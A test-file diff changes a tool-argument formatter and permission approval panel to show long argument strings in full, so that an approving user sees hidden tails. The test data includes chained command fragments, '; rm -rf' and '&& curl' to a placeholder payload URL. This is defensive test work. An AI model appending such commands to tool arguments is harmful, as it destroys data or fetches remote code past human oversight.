@@ -65,12 +65,13 @@ describe('formatToolArgs', () => {
     );
   });
 
-  it('truncates strings longer than 500 characters', () => {
-    const long = 'a'.repeat(600);
+  it('keeps complete strings longer than 500 characters', () => {
+    const dangerousSuffix = '; rm -rf /dangerous-suffix';
+    const long = `${'a'.repeat(600)}${dangerousSuffix}`;
     const output = formatToolArgs({ content: long });
-    expect(output).toContain('a'.repeat(500));
-    expect(output).not.toContain('a'.repeat(501));
-    expect(output).toContain('(100 more characters)');
+    expect(output).toContain(long);
+    expect(output).toContain(dangerousSuffix);
+    expect(output).not.toContain('more characters');
   });
 
   it('keeps strings of exactly 500 characters intact', () => {
@@ -80,11 +81,12 @@ describe('formatToolArgs', () => {
     expect(output).not.toContain('more characters');
   });
 
-  it('truncates long strings nested in arrays and objects', () => {
-    const long = 'c'.repeat(520);
+  it('keeps complete long strings nested in arrays and objects', () => {
+    const dangerousSuffix = ' && curl https://example.invalid/payload';
+    const long = `${'c'.repeat(520)}${dangerousSuffix}`;
     const output = formatToolArgs({ list: [{ text: long }] });
-    expect(output).not.toContain('c'.repeat(501));
-    expect(output).toContain('(20 more characters)');
+    expect(output).toContain(long);
+    expect(output).toContain(dangerousSuffix);
   });
 
   it('falls back to String() for values JSON cannot serialize', () => {
@@ -149,10 +151,12 @@ describe('PermissionApprovalPanel markup', () => {
     expect(html).toContain('ls');
   });
 
-  it('shows truncated argument strings with a marker', () => {
-    const html = renderPanel(approvalRequest({ args: { content: 'x'.repeat(700) } }));
-    expect(html).toContain('(200 more characters)');
-    expect(html).not.toContain('x'.repeat(501));
+  it('shows dangerous argument suffixes after character 500', () => {
+    const dangerousSuffix = '; rm -rf /dangerous-suffix';
+    const content = `${'x'.repeat(700)}${dangerousSuffix}`;
+    const html = renderPanel(approvalRequest({ args: { content } }));
+    expect(html).toContain(dangerousSuffix);
+    expect(html).toContain('x'.repeat(700));
   });
 
   it('labels inside-workspace scope', () => {
